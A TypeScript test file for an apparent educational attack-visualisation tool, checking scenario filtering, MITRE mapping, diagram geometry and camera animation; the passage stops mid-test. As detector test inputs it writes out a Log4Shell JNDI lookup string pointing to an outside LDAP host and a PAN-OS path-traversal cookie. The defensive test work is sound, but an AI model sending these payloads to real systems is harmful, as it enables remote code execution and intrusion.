import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { ATTACK_SCENARIOS } from './attack-scenarios';
import {
  analyzeCustomLogInput,
  computeStageView,
  filterScenarios,
  stepBackward,
  stepForward } from './simulation-engine';
import { queryAttackLibrary } from './attack-library-service';
import {
  buildVisualizerPacketRoutes,
  getCanonicalFlowZone,
  sampleQuadraticBezier } from './attack-visualizer-geometry';
import {
  buildCorrelatedStepLogs,
  extractEventIdsFromLog,
  tokenizeLogLineForHighlight } from './log-inspector-utils';
import {
  buildEntityDrillDownData,
  buildInternalNodeSubBoard,
  buildWhiteboardSchematic,
  NETWORK_ZONE_COLUMNS } from './sketch-zones-and-drilldown';
import { computeScenarioChoreography } from './camera-choreography';

describe('Attack Explorer Simulation Engine, AttackLibrary, AttackVisualizer & LogInspector', () => {
  it('filterScenarios filters by category and search query accurately across all 26 scenarios (including 20 APT campaigns)', () => {
    const all = filterScenarios(ATTACK_SCENARIOS, 'ALL', '');
    assert.equal(all.length, 26);

    const malwareOnly = filterScenarios(ATTACK_SCENARIOS, 'MALWARE', '');
    assert.equal(malwareOnly.length, 12);

    const byMitre = filterScenarios(ATTACK_SCENARIOS, 'ALL', 'T1055.012');
    assert.equal(byMitre.length, 1);
    assert.equal(byMitre[0].id, 'process-hollowing');

    const elasticScenarios = filterScenarios(ATTACK_SCENARIOS, 'ALL', 'Elastic Security Labs');
    assert.ok(elasticScenarios.length >= 2);

    const unit42Scenarios = filterScenarios(ATTACK_SCENARIOS, 'ALL', 'Unit 42');
    assert.ok(unit42Scenarios.length >= 3);
  });

  it('stepForward and stepBackward bound stage indices properly', () => {
    const scenario = ATTACK_SCENARIOS[0]; // 5 stages
    assert.equal(stepForward(scenario, 0), 1);
    assert.equal(stepForward(scenario, 4), 5);
    assert.equal(stepForward(scenario, 5), 5);
    assert.equal(stepBackward(5), 4);
    assert.equal(stepBackward(0), 0);
  });

  it('computeStageView computes progressive telemetry and active nodes per stage', () => {
    const scenario = ATTACK_SCENARIOS[0];
    const overview = computeStageView(scenario, 0, 'ALL');
    assert.equal(overview.currentStage, null);
    assert.equal(overview.visibleTelemetry.length, scenario.telemetry.length);

    const stage2 = computeStageView(scenario, 2, 'ALL');
    assert.ok(stage2.currentStage);
    assert.equal(stage2.currentStage.index, 2);
    assert.ok(stage2.visibleTelemetry.every((t) => t.stageIndex <= 2));
  });

  it('analyzeCustomLogInput detects Process Hollowing, Log4Shell, AMSI, Kerberoasting, and new APT logs (Unit 42, Elastic, Talos, Mandiant, Splunk)', () => {
    const hollowFindings = analyzeCustomLogInput(
      'EventID 25 Image is replaced NtUnmapViewOfSection'
    );
    assert.equal(hollowFindings[0].recommendedScenarioId, 'process-hollowing');

    const log4jFindings = analyzeCustomLogInput(
      'User-Agent: ${jndi:ldap://10.0.0.1:1389/Exploit}'
    );
    assert.equal(log4jFindings[0].recommendedScenarioId, 'log4shell-dfir');

    const krbFindings = analyzeCustomLogInput(
      'EventID 4769 TicketEncryptionType 0x17'
    );
    assert.equal(krbFindings[0].recommendedScenarioId, 'ad-kerberoasting');

    const unit42PanFindings = analyzeCustomLogInput(
      'Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/ UPSTYLE'
    );
    assert.equal(
      unit42PanFindings[0].recommendedScenarioId,
      'unit42-panos-midnight-eclipse'
    );

    const elasticGrimFindings = analyzeCustomLogInput(
      'mmc.exe ImageLoaded C:\\Windows\\System32\\apds.dll GrimResource'
    );
    assert.equal(
      elasticGrimFindings[0].recommendedScenarioId,
      'elastic-grimresource-msc'
    );

    const talosArcaneFindings = analyzeCustomLogInput(
      'CVE-2024-20353 Line Dancer lina_monitor'
    );
    assert.equal(
      talosArcaneFindings[0].recommendedScenarioId,
      'talos-arcanedoor-asa'
    );
  });

  it('queryAttackLibrary maps scenarios to MITRE ATT&CK categories and filters by tactic phase', () => {
    const fullLib = queryAttackLibrary();
    assert.equal(fullLib.totalCount, 26);
    assert.equal(fullLib.mitreCategories.length, 7);

    // Phase 4 (Defense Evasion / Process Injection) should include Process Hollowing & AMSI Bypass
    const phase4 = queryAttackLibrary({ mitrePhase: 4 });
    assert.ok(
      phase4.items.some((item) => item.scenarioId === 'process-hollowing')
    );
    assert.ok(
      phase4.items.some((item) => item.scenarioId === 'amsi-reflective-dll')
    );

    // Search by log source "Sysmon EID 25"
    const eid25 = queryAttackLibrary({ search: 'Sysmon EID 25' });
    assert.equal(eid25.filteredCount, 1);
    assert.equal(eid25.items[0].scenarioId, 'process-hollowing');
  });

  it('AttackVisualizer geometry maps nodes to Attacker/Gateway/Target zones and builds animated Bezier packet routes', () => {
    const scenario = ATTACK_SCENARIOS[1]; // Log4Shell DFIR
    const zones = scenario.nodes.map((n) => getCanonicalFlowZone(n.role).zone);
    assert.ok(zones.includes('ATTACKER'), 'Should map attacker node');
    assert.ok(zones.includes('GATEWAY'), 'Should map gateway/sensor node');
    assert.ok(zones.includes('TARGET'), 'Should map target node');

    const sampled = sampleQuadraticBezier(100, 100, 300, 50, 500, 100, 8);
    assert.equal(sampled.xKeyframes.length, 9);
    assert.equal(sampled.yKeyframes.length, 9);
    assert.equal(sampled.xKeyframes[0], 100);
    assert.equal(sampled.xKeyframes[8], 500);

    const stageView = computeStageView(scenario, 1, 'ALL');
    const routes = buildVisualizerPacketRoutes(
      scenario.nodes,
      stageView.visibleTelemetry,
      stageView.currentStage?.index ?? null,
      null
    );
    assert.ok(routes.length > 0);
    const activeRoutes = routes.filter((r) => r.isCurrentStep);
    assert.ok(activeRoutes.length >= 1);
    assert.ok(activeRoutes[0].pathD.startsWith('M '));
    assert.equal(activeRoutes[0].xKeyframes.length, 9);
  });

  it('LogInspector utils extract and correlate Event IDs 1 and 4688 and highlight EventID tokens', () => {
    const scenario = ATTACK_SCENARIOS[0]; // Process Hollowing
    const stepLogs = buildCorrelatedStepLogs(scenario, 1);
    assert.equal(stepLogs.length, scenario.telemetry.length);

    // Step 1 (Process creation) should highlight both Sysmon EventID 1 and correlated WinSec EventID 4688
    const step1 = stepLogs[0];
    const eidList = extractEventIdsFromLog(step1.event).map((e) => e.id);
    assert.ok(eidList.includes('1'), 'Should extract Sysmon Event ID 1');
    assert.ok(
      eidList.includes('4688'),
      'Should correlate Windows Security Event ID 4688'
    );
    assert.ok(step1.correlatedRawLog.includes('<EventID>1</EventID>'));
    assert.ok(step1.correlatedRawLog.includes('<EventID>4688</EventID>'));

    const tokens = tokenizeLogLineForHighlight('    <EventID>4688</EventID>');
    assert.ok(
      tokens.some(
        (t) => t.kind === 'event_id' && t.text === '<EventID>4688</EventID>'
      )
    );
  });

  it('Whiteboard schematic builds scenario-specific non-collinear 2D topologies, explicit network devices, and expandable internal visual sub-boards', () => {
    const hollowScenario = ATTACK_SCENARIOS[0]; // process-hollowing
    const log4jScenario = ATTACK_SCENARIOS[1]; // log4shell-dfir
    const krbScenario = ATTACK_SCENARIOS[3]; // ad-kerberoasting
    const dnsScenario = ATTACK_SCENARIOS[4]; // dns-tunneling-exfil

    assert.equal(NETWORK_ZONE_COLUMNS.length, 4);

    const hollowSchematic = buildWhiteboardSchematic(hollowScenario, 1);
    const log4jSchematic = buildWhiteboardSchematic(log4jScenario, 1);
    const krbSchematic = buildWhiteboardSchematic(krbScenario, 1);
    const dnsSchematic = buildWhiteboardSchematic(dnsScenario, 1);

    // 1. Verify scenario-specific network device icons & distinct 2D zone/node layouts
    const hollowNetDev = hollowSchematic.nodes.find((n) => n.isNetworkDevice)!;
    const log4jNetDev = log4jSchematic.nodes.find((n) => n.isNetworkDevice)!;
    const krbNetDev = krbSchematic.nodes.find((n) => n.isNetworkDevice)!;
    const dnsNetDev = dnsSchematic.nodes.find((n) => n.isNetworkDevice)!;

    assert.equal(hollowNetDev.iconType, 'FIREWALL_ROUTER');
    assert.equal(log4jNetDev.iconType, 'WAF_REVERSE_PROXY');
    assert.equal(krbNetDev.iconType, 'CORE_SWITCH');
    assert.equal(dnsNetDev.iconType, 'DNS_RESOLVER');

    // Non-collinear 2D zones (yStart varies across zones within a scenario, and differs across scenarios)
    const hollowZoneYStarts = hollowSchematic.zones.map((z) => z.yStart);
    assert.ok(
      new Set(hollowZoneYStarts).size >= 3,
      'Zones should be staggered in 2D (non-collinear yStart)'
    );
    assert.notDeepEqual(
      hollowSchematic.nodes.map((n) => `${n.wx},${n.wy}`),
      log4jSchematic.nodes.map((n) => `${n.wx},${n.wy}`),
      'Different scenarios must have distinct 2D node placements'
    );
    assert.ok(hollowSchematic.backboneLinks.length >= 3);

    // 2. Verify Click-to-Expand Internal Visual Sub-Board for Network Device, Laptop, and Malware nodes
    const laptopNode = hollowSchematic.nodes.find(
      (n) => n.id === 'victim_laptop_node'
    )!;
    const malwareNode = hollowSchematic.nodes.find(
      (n) => n.id === 'malware_sandbox_node'
    )!;

    const netDevSubBoard = buildInternalNodeSubBoard(
      hollowScenario,
      hollowNetDev,
      hollowSchematic.flows,
      1
    );
    const laptopSubBoard = buildInternalNodeSubBoard(
      hollowScenario,
      laptopNode,
      hollowSchematic.flows,
      2
    );
    const malwareSubBoard = buildInternalNodeSubBoard(
      hollowScenario,
      malwareNode,
      hollowSchematic.flows,
      3
    );

    assert.equal(netDevSubBoard.zones.length, 4);
    assert.equal(netDevSubBoard.subNodes.length, 5);
    assert.equal(netDevSubBoard.subFlows.length, 4);
    // Node #2 (hollowNetDev, chainOrder=2) preserves parent prefix "2"
    assert.equal(netDevSubBoard.subFlows[0].sequenceCode, '2.1');
    assert.equal(netDevSubBoard.subFlows[0].forwardSeq, '2.1.1');
    assert.equal(netDevSubBoard.subFlows[0].returnSeq, '2.1.2');
    assert.equal(netDevSubBoard.backboneLinks[0].sequenceCode, 'L2.1');
    assert.equal(netDevSubBoard.subFlows[0].forwardArrows.length, 3);

    // Node #4 (malwareNode, chainOrder=4) preserves parent prefix "4"
    assert.equal(malwareSubBoard.sequenceLineage.parentSequenceCode, '4');
    assert.deepEqual(
      malwareSubBoard.subFlows.map((f) => f.sequenceCode),
      ['4.1', '4.2', '4.3', '4.4']
    );
    assert.equal(malwareSubBoard.subFlows[0].forwardSeq, '4.1.1');
    assert.equal(malwareSubBoard.subFlows[0].returnSeq, '4.1.2');
    assert.equal(malwareSubBoard.subFlows[3].forwardSeq, '4.4.1');
    assert.equal(malwareSubBoard.subFlows[3].returnSeq, '4.4.2');

    // Verify dynamic active step calculation inside nested view when stageIndex=3
    assert.equal(malwareSubBoard.subFlows[2].isCurrentStep, true);

    assert.equal(laptopSubBoard.zones.length, 4);
    assert.equal(laptopSubBoard.subNodes.length, 5);
    assert.equal(malwareSubBoard.zones.length, 4);
    assert.equal(malwareSubBoard.subNodes.length, 5);

    // 3. Verify legacy EntityDrillDownData still works
    const malwareDrillDown = buildEntityDrillDownData(
      hollowScenario,
      malwareNode
    );
    assert.ok(malwareDrillDown.malwareProcesses.length >= 2);
    assert.ok(malwareDrillDown.laptopHostActivities.length >= 4);
    assert.ok(malwareDrillDown.lateralMovementHops.length >= 3);
  });

  it('computeScenarioChoreography drives multi-phase camera zoom/pan, progressive node reveal, callouts, and comet packets', () => {
    const scenario = ATTACK_SCENARIOS[0];
    const s0 = buildWhiteboardSchematic(scenario, 0);

    // 1. Idle Overview -> full camera (scale = 1)
    const idle = computeScenarioChoreography(
      scenario,
      s0.nodes,
      s0.flows,
      0,
      'IDLE_OVERVIEW',
      true
    );
    assert.equal(idle.camera.scale, 1);
    assert.equal(idle.camera.futureNodeIds.length, 0);

    // 2. Start Node Focus -> zooms onto Node #1 and dims future nodes
    const startFocus = computeScenarioChoreography(
      scenario,
      s0.nodes,
      s0.flows,
      0,
      'START_NODE_FOCUS',
      true
    );
    assert.ok(startFocus.camera.scale >= 1.4);
    assert.deepEqual(startFocus.camera.visibleNodeIds, [s0.nodes[0].id]);
    assert.equal(startFocus.camera.futureNodeIds.length, s0.nodes.length - 1);
    assert.ok(startFocus.callout !== null);

    // 3. Stage 1 Active -> frames Stage 1 nodes, generates callout & comet packet capsule
    const s1 = buildWhiteboardSchematic(scenario, 1);
    const stage1 = computeScenarioChoreography(
      scenario,
      s1.nodes,
      s1.flows,
      1,
      'STAGE_ACTIVE',
      true
    );
    assert.ok(stage1.camera.scale >= 1.2);
    assert.ok(stage1.callout !== null);
    assert.ok(stage1.activePacket !== null);
    assert.ok(stage1.activePacket?.forwardHeader.startsWith('#1.1→'));

    // 4. Outro Complete -> zooms back out to 100% overview
    const outro = computeScenarioChoreography(
      scenario,
      s1.nodes,
      s1.flows,
      scenario.stages.length,
      'OUTRO_COMPLETE',
      true
    );
    assert.equal(outro.camera.scale, 1);
    assert.equal(outro.camera.frameId, 'outro-full');
  });

  it('computeCinematicDirectorState orchestrates Prince-of-Persia intro survey, origin focus, dynamic step zoom/pan, and outro zoom-out', async () => {
    const { computeCinematicDirectorState } = await import(
      './cinematic-camera-director'
    );
    const scenario = ATTACK_SCENARIOS[0];
    const s0 = buildWhiteboardSchematic(scenario, 0);

    // 1. Overview
    const overview = computeCinematicDirectorState(
      scenario,
      s0.nodes,
      s0.flows,
      0,
      'OVERVIEW',
      true
    );
    assert.equal(overview.camera.scale, 1);
    assert.equal(overview.camera.txPct, 0);
    assert.equal(overview.camera.tyPct, 0);

    // 2. Intro Survey (Prince of Persia level briefing)
    const survey = computeCinematicDirectorState(
      scenario,
      s0.nodes,
      s0.flows,
      1,
      'INTRO_SURVEY',
      true
    );
    assert.equal(survey.phase, 'INTRO_SURVEY');
    assert.ok(survey.camera.scale >= 1.05);
    assert.ok(survey.activeCallout !== null);

    // 3. Intro Focus Origin (Zooms closely onto starting node #1 and fades future nodes)
    const originFocus = computeCinematicDirectorState(
      scenario,
      s0.nodes,
      s0.flows,
      1,
      'INTRO_FOCUS_ORIGIN',
      true
    );
    assert.equal(originFocus.phase, 'INTRO_FOCUS_ORIGIN');
    assert.ok(originFocus.camera.scale >= 1.4);
    assert.equal(
      originFocus.nodeStates[s0.nodes[0].id].role,
      'ORIGIN_FOCUS'
    );
    assert.equal(originFocus.nodeStates[s0.nodes[0].id].opacity, 1);
    assert.equal(originFocus.nodeStates[s0.nodes[1].id].role, 'FUTURE');
    assert.ok(originFocus.nodeStates[s0.nodes[1].id].opacity < 0.3);

    // 4. Stage Active (Frames source & target nodes and attaches speech-bubble callout)
    const s1 = buildWhiteboardSchematic(scenario, 1);
    const stageActive = computeCinematicDirectorState(
      scenario,
      s1.nodes,
      s1.flows,
      1,
      'STAGE_ACTIVE',
      true
    );
    assert.equal(stageActive.phase, 'STAGE_ACTIVE');
    assert.ok(stageActive.camera.scale >= 1.15);
    assert.ok(stageActive.activeCallout !== null);
    assert.ok(stageActive.activeCallout?.forwardTag.startsWith('#1.1→'));

    // 5. Outro Complete (Zooms back out to full topology)
    const outroComplete = computeCinematicDirectorState(
      scenario,
      s1.nodes,
      s1.flows,
      scenario.stages.length,
      'OUTRO_COMPLETE',
      true
    );
    assert.equal(outroComplete.camera.scale, 1);
    assert.equal(outroComplete.progressPct, 100);
  });

  it('sortScenarios, categorizeScenarios, clampPanelDimension, and DEFAULT_PLAYBACK_SPEED (0.5x) work accurately', async () => {
    const {
      sortScenarios,
      categorizeScenarios,
      clampPanelDimension,
      DEFAULT_PLAYBACK_SPEED,
      cyclePlaybackSpeed } = await import('./simulation-engine');

    // 0. Default Playback Speed = 0.5x & Speed Cycling
    assert.equal(DEFAULT_PLAYBACK_SPEED, 0.5);
    assert.equal(cyclePlaybackSpeed(0.5), 1);
    assert.equal(cyclePlaybackSpeed(1), 2);
    assert.equal(cyclePlaybackSpeed(2), 0.5);

    // 1. Panel Resize Clamping
    assert.equal(clampPanelDimension(180, 240, 560), 240);
    assert.equal(clampPanelDimension(640, 240, 560), 560);
    assert.equal(clampPanelDimension(360.4, 240, 560), 360);

    // 2. Sorting by STAGES_DESC vs STAGES_ASC vs NAME_ASC vs MITRE_CODE
    const byStagesDesc = sortScenarios(ATTACK_SCENARIOS, 'STAGES_DESC');
    assert.ok(
      byStagesDesc[0].stages.length >=
        byStagesDesc[byStagesDesc.length - 1].stages.length
    );

    const byStagesAsc = sortScenarios(ATTACK_SCENARIOS, 'STAGES_ASC');
    assert.ok(
      byStagesAsc[0].stages.length <=
        byStagesAsc[byStagesAsc.length - 1].stages.length
    );

    const byName = sortScenarios(ATTACK_SCENARIOS, 'NAME_ASC');
    assert.ok(byName[0].name.localeCompare(byName[1].name) <= 0);

    const byMitre = sortScenarios(ATTACK_SCENARIOS, 'MITRE_CODE');
    assert.ok(byMitre[0].code.localeCompare(byMitre[1].code) <= 0);

    // 3. Categorize by CATEGORY, MITRE_PHASE, and FLAT
    const catGroups = categorizeScenarios(ATTACK_SCENARIOS, 'CATEGORY');
    assert.ok(catGroups.length >= 3);
    const totalInCatGroups = catGroups.reduce(
      (acc, g) => acc + g.scenarios.length,
      0
    );
    assert.equal(totalInCatGroups, ATTACK_SCENARIOS.length);

    const tacticGroups = categorizeScenarios(ATTACK_SCENARIOS, 'MITRE_PHASE');
    assert.ok(tacticGroups.length >= 2);
    const totalInTacticGroups = tacticGroups.reduce(
      (acc, g) => acc + g.scenarios.length,
      0
    );
    assert.equal(totalInTacticGroups, ATTACK_SCENARIOS.length);

    const flatGroups = categorizeScenarios(ATTACK_SCENARIOS, 'FLAT');
    assert.equal(flatGroups.length, 1);
    assert.equal(flatGroups[0].scenarios.length, ATTACK_SCENARIOS.length);
  });

  it('Every scenario node, stage, and internal sub-board explicitly specifies its Host System context and internal activities', async () => {
    const { getStageLocationContext } = await import(
      './sketch-zones-and-drilldown'
    );

    for (const scenario of ATTACK_SCENARIOS) {
      const schematic = buildWhiteboardSchematic(scenario, 0);
      assert.equal(schematic.nodes.length, 6);

      // Node 1 (Attacker/Foothold) and Node 4 (Malware/Process) must never duplicate labels
      assert.notEqual(
        schematic.nodes[0].label,
        schematic.nodes[3].label,
        `Scenario ${scenario.id} must have distinct Node 1 and Node 4 labels`
      );

      for (const node of schematic.nodes) {
        assert.ok(
          node.hostContext.length > 8 && node.hostContext.length > 8,
          `Node ${node.id} in ${scenario.id} must have hostContext`
        );
        assert.ok(
          node.activitySummary.length > 8 &&
            node.activitySummary.length > 8,
          `Node ${node.id} in ${scenario.id} must have activitySummary`
        );
      }

      const hostNode = schematic.nodes.find(
        (n) => n.id === 'victim_laptop_node'
      )!;
      const processNode = schematic.nodes.find(
        (n) => n.id === 'malware_sandbox_node'
      )!;

      // Companion linkage between Host ③ and Process ④ running on that Host
      assert.equal(
        hostNode.companionHostOrProcessNodeId,
        'malware_sandbox_node'
      );
      assert.equal(
        processNode.companionHostOrProcessNodeId,
        'victim_laptop_node'
      );

      // Stage Location Context for overview (0) and stage 2
      const ctxOverview = getStageLocationContext(
        scenario,
        schematic.nodes,
        schematic.flows,
        0
      );
      assert.ok(ctxOverview.currentSystemLabel.includes(hostNode.label));
      assert.ok(
        ctxOverview.currentProcessOrComponentLabel.includes(
          processNode.label
        )
      );

      const ctxStage2 = getStageLocationContext(
        scenario,
        schematic.nodes,
        schematic.flows,
        2
      );
      assert.ok(ctxStage2.scopeBadge.includes('S2'));

      // Expanded Sub-Boards for Host ③ and Process ④ must have explicit environmentBreadcrumb and subNode hostContext
      const hostSubBoard = buildInternalNodeSubBoard(
        scenario,
        hostNode,
        schematic.flows,
        1
      );
      const processSubBoard = buildInternalNodeSubBoard(
        scenario,
        processNode,
        schematic.flows,
        2
      );

      assert.equal(hostSubBoard.currentScopeType, 'HOST_OS_ENVIRONMENT');
      assert.ok(
        hostSubBoard.environmentBreadcrumb.includes(hostNode.label)
      );
      assert.ok(
        hostSubBoard.environmentBreadcrumb.includes(hostNode.label)
      );

      assert.equal(processSubBoard.currentScopeType, 'MALWARE_ON_HOST');
      assert.ok(
        processSubBoard.environmentBreadcrumb.includes(processNode.label)
      );
      assert.ok(
        processSubBoard.subNodes.every(
          (sn) => sn.hostContext.length > 5 && sn.hostContext.length > 5
        )
      );
    }
  });

  it('ActiveEnvironment state system tags all logs and malware activities and transforms canvas architecture across Workstation, Server, and Cloud', async () => {
    const {
      ACTIVE_ENVIRONMENT_PROFILES,
      getActiveEnvironmentProfile,
      tagTelemetryEventWithEnvironment } = await import('./simulation-engine');

    const scenario = ATTACK_SCENARIOS[0]; // Process Hollowing

    // 1. Verify all 3 environment profiles exist with canonical badge labels & tags
    const wksProfile = getActiveEnvironmentProfile('WORKSTATION');
    const srvProfile = getActiveEnvironmentProfile('SERVER');
    const cldProfile = getActiveEnvironmentProfile('CLOUD');

    assert.equal(wksProfile.badgeLabel, 'Target Workstation');
    assert.equal(srvProfile.badgeLabel, 'Domain Controller');
    assert.equal(cldProfile.badgeLabel, 'Cloud Environment');
    assert.equal(
      Object.keys(ACTIVE_ENVIRONMENT_PROFILES).length,
      3
    );

    // 2. Verify computeStageView tags all visibleTelemetry & activeEdges with activeEnvironment
    const stageViewSrv = computeStageView(scenario, 1, 'ALL', 'SERVER');
    assert.equal(stageViewSrv.activeEnvironment, 'SERVER');
    assert.equal(
      stageViewSrv.environmentProfile.badgeLabel,
      'Domain Controller'
    );
    assert.ok(
      stageViewSrv.visibleTelemetry.every(
        (ev) =>
          ev.activeEnvironmentId === 'SERVER' &&
          ev.activeEnvironmentTag === 'ENV:SERVER/CORP-DC01' &&
          ev.activeEnvironmentBadge === 'Domain Controller' &&
          ev.environmentTaggedInfo.includes('ENV:SERVER/CORP-DC01')
      )
    );

    const taggedSingle = tagTelemetryEventWithEnvironment(
      scenario.telemetry[0],
      'CLOUD'
    );
    assert.equal(taggedSingle.activeEnvironmentId, 'CLOUD');
    assert.equal(taggedSingle.activeEnvironmentBadge, 'Cloud Environment');
    assert.equal(taggedSingle.activeEnvironmentTag, 'ENV:CLOUD/AWS-EKS-VPC');

    // 3. Verify buildCorrelatedStepLogs tags step logs and prepends ACTIVE_ENVIRONMENT header
    const cloudLogs = buildCorrelatedStepLogs(scenario, 1, 'CLOUD');
    assert.ok(
      cloudLogs.every(
        (item) =>
          item.activeEnvironmentId === 'CLOUD' &&
          item.environmentTag === 'ENV:CLOUD/AWS-EKS-VPC' &&
          item.environmentBadge === 'Cloud Environment' &&
          item.correlatedRawLog.includes(
            '[ACTIVE_ENVIRONMENT: Cloud Environment | Tag: ENV:CLOUD/AWS-EKS-VPC'
          ) &&
          item.correlatedRawLog.includes('eks-prod-node-01.aws.internal')
      )
    );
    assert.ok(
      cloudLogs[0].correlatedRawLog.includes(
        '<Computer>eks-prod-node-01.aws.internal</Computer>'
      )
    );

    // 4. Verify buildWhiteboardSchematic transforms zones, nodes, icons, and tags across environments
    const wksBoard = buildWhiteboardSchematic(scenario, 1, 'WORKSTATION');
    const srvBoard = buildWhiteboardSchematic(scenario, 1, 'SERVER');
    const cldBoard = buildWhiteboardSchematic(scenario, 1, 'CLOUD');

    assert.notEqual(
      wksBoard.zones[2].title,
      srvBoard.zones[2].title,
      'Zone 3 title must change between Workstation and Server architectures'
    );
    assert.notEqual(
      srvBoard.zones[2].title,
      cldBoard.zones[2].title,
      'Zone 3 title must change between Server and Cloud architectures'
    );

    const wksHost = wksBoard.nodes.find((n) => n.id === 'victim_laptop_node')!;
    const srvHost = srvBoard.nodes.find((n) => n.id === 'victim_laptop_node')!;
    const cldHost = cldBoard.nodes.find((n) => n.id === 'victim_laptop_node')!;

    assert.equal(wksHost.iconType, 'VICTIM_LAPTOP');
    assert.equal(srvHost.iconType, 'LATERAL_SERVER');
    assert.ok(srvHost.label.includes('Domain Controller'));
    assert.ok(cldHost.label.includes('Cloud Workload Pod'));

    assert.ok(
      srvBoard.nodes.every(
        (n) =>
          n.activeEnvironmentId === 'SERVER' &&
          n.activeEnvironmentTag === 'ENV:SERVER/CORP-DC01'
      )
    );
    assert.ok(
      cldBoard.nodes.every(
        (n) =>
          n.activeEnvironmentId === 'CLOUD' &&
          n.activeEnvironmentTag === 'ENV:CLOUD/AWS-EKS-VPC'
      )
    );
  });

  it('Authoritative Sources & Legal Compliance attribution covers all scenarios and zero Persian characters exist anywhere in scenarios', async () => {
    const {
      GLOBAL_FRAMEWORK_SOURCES,
      LEGAL_COMPLIANCE_STATEMENT,
      getScenarioAttribution } = await import('./attack-sources-and-legal');

    assert.ok(GLOBAL_FRAMEWORK_SOURCES.length >= 4);
    assert.ok(
      LEGAL_COMPLIANCE_STATEMENT.syntheticDataGuarantee.includes(
        '100% Synthetic'
      )
    );
    assert.ok(
      LEGAL_COMPLIANCE_STATEMENT.copyrightAttribution.includes('MITRE ATT&CK')
    );

    
    for (const scenario of ATTACK_SCENARIOS) {
      const attr = getScenarioAttribution(scenario);
      assert.equal(attr.scenarioId, scenario.id);
      assert.ok(attr.mitreTechniques.length >= 1);
      assert.ok(attr.primarySources.length >= 2);
      assert.ok(attr.syntheticDataNotice.length > 20);

      assert.equal(
        /[\u0600-\u06FF]/.test(JSON.stringify(scenario)),
        false,
        `Scenario ${scenario.id} should contain zero Persian characters`
      );
    }
  });

  it('computeMitreTacticFrequency and getCuratedThreatIntel compute MITRE tactic bar chart metrics and threat intelligence for all scenarios', async () => {
    const { computeMitreTacticFrequency, getCuratedThreatIntel } = await import(
      './threat-intel-service'
    );

    for (const scenario of ATTACK_SCENARIOS) {
      const stats = computeMitreTacticFrequency(scenario);
      assert.equal(stats.length, 7, 'Should return 7 MITRE tactic buckets');
      const totalStagesCounted = stats.reduce(
        (acc, s) => acc + s.scenarioStageCount,
        0
      );
      assert.equal(
        totalStagesCounted,
        scenario.stages.length,
        `Total stage count across MITRE tactics should match stages length for ${scenario.id}`
      );

      const intel = getCuratedThreatIntel(scenario);
      assert.equal(intel.scenarioId, scenario.id);
      assert.ok(intel.cves.length >= 1, `Should provide CVEs/advisories for ${scenario.id}`);
      assert.ok(intel.actorGroups.length >= 2, `Should provide actor groups for ${scenario.id}`);
      assert.ok(intel.groundedSources.length >= 2, `Should provide grounding citation links for ${scenario.id}`);
    }
  });

  it('canvas-interaction-engine computes scroll zoom, Windows-style marquee multi-selection, single/group node dragging, and live Bezier flow geometry recalculation', async () => {
    const {
      computeScrollWheelZoom,
      applyNodePositionOffsets,
      applyZonePositionOffsets,
      moveSelectedNodesByDelta,
      computeMarqueeSelectedNodeIds,
      recomputeGeometryForMovedBoard,
      MIN_CANVAS_ZOOM,
      MAX_CANVAS_ZOOM,
    } = await import('./canvas-interaction-engine');

    // 1. Scroll wheel zoom in/out and clamping
    const zoomedIn = computeScrollWheelZoom(1.0, -120);
    assert.ok(zoomedIn > 1.0, 'Scrolling up (negative deltaY) should zoom in');
    const zoomedOut = computeScrollWheelZoom(1.0, 120);
    assert.ok(zoomedOut < 1.0, 'Scrolling down (positive deltaY) should zoom out');
    assert.equal(computeScrollWheelZoom(2.48, -500), MAX_CANVAS_ZOOM);
    assert.equal(computeScrollWheelZoom(0.46, 500), MIN_CANVAS_ZOOM);

    // 2. Windows-style marquee box multi-selection
    const scenario = ATTACK_SCENARIOS[0];
    const schematic = buildWhiteboardSchematic(scenario, 1);
    const marqueeHitIds = computeMarqueeSelectedNodeIds(schematic.nodes, {
      startWx: 100,
      startWy: 120,
      currentWx: 1050,
      currentWy: 580,
    });
    assert.ok(
      marqueeHitIds.length >= 3,
      'Marquee rectangle across left/center board should select multiple nodes'
    );

    // 3. Moving multiple selected nodes together in unison & recomputing flows
    const offsetsAfterDrag = moveSelectedNodesByDelta(
      marqueeHitIds.slice(0, 2),
      {},
      65,
      -40
    );
    const movedNodes = applyNodePositionOffsets(
      schematic.nodes,
      offsetsAfterDrag
    );
    const firstMovedId = marqueeHitIds[0];
    const origNode = schematic.nodes.find((n) => n.id === firstMovedId)!;
    const movedNode = movedNodes.find((n) => n.id === firstMovedId)!;
    assert.equal(movedNode.wx, origNode.wx + 65);
    assert.equal(movedNode.wy, origNode.wy - 40);

    const recomputed = recomputeGeometryForMovedBoard(
      schematic.nodes,
      movedNodes,
      schematic.flows,
      schematic.backboneLinks
    );
    assert.notEqual(
      recomputed.flows[0].pathD,
      schematic.flows[0].pathD,
      'Connected flow Bezier pathD must dynamically update when nodes move'
    );
    assert.notEqual(
      recomputed.backboneLinks[0].x1,
      schematic.backboneLinks[0].x1,
      'Connected backbone link endpoint must dynamically update when nodes move'
    );

    // 4. Moving network zone containers
    const movedZones = applyZonePositionOffsets(schematic.zones, {
      [schematic.zones[0].id]: { dx: 30, dy: 20 },
    });
    assert.equal(movedZones[0].xStart, schematic.zones[0].xStart + 30);

    // 5. Pointer hold interaction mode resolution (Right-click hold -> SELECT / Box Select, Left-click hold -> PAN / Pan Page)
    const { resolveCanvasHoldInteractionMode } = await import(
      './canvas-interaction-engine'
    );
    const rightHold = resolveCanvasHoldInteractionMode({ button: 2 });
    assert.equal(rightHold.mode, 'SELECT');
    assert.equal(rightHold.useMarqueeSelection, true);
    assert.equal(rightHold.useCanvasPan, false);

    const leftHold = resolveCanvasHoldInteractionMode({ button: 0 });
    assert.equal(leftHold.mode, 'PAN');
    assert.equal(leftHold.useMarqueeSelection, false);
    assert.equal(leftHold.useCanvasPan, true);

    // Sticky toolbar SELECT must not trap mouse left-drag into marquee.
    const leftWhileToolbarSelect = resolveCanvasHoldInteractionMode({
      button: 0,
      toolbarMode: 'SELECT',
      pointerType: 'mouse',
    });
    assert.equal(leftWhileToolbarSelect.mode, 'PAN');
    assert.equal(leftWhileToolbarSelect.useMarqueeSelection, false);
    assert.equal(leftWhileToolbarSelect.useCanvasPan, true);

    // Touch with toolbar SELECT still marquees (no right-click on phones).
    const touchSelect = resolveCanvasHoldInteractionMode({
      button: 0,
      toolbarMode: 'SELECT',
      pointerType: 'touch',
    });
    assert.equal(touchSelect.mode, 'SELECT');
    assert.equal(touchSelect.useMarqueeSelection, true);
